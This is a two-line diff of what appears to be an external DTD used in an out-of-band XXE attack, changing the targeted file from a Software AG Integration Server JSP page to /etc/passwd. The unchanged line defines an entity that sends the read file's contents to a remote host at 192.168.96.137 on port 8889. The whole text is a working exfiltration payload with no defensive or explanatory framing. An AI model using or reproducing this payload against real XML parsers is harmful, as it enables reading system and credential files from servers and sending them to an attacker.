@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///C:\SoftwareAG\profiles\IS_default\workspace\webapps\ROOT\index.jsp">
+<!ENTITY % data SYSTEM "file:///etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.96.137:8889/DATA?%data;&#39;>">
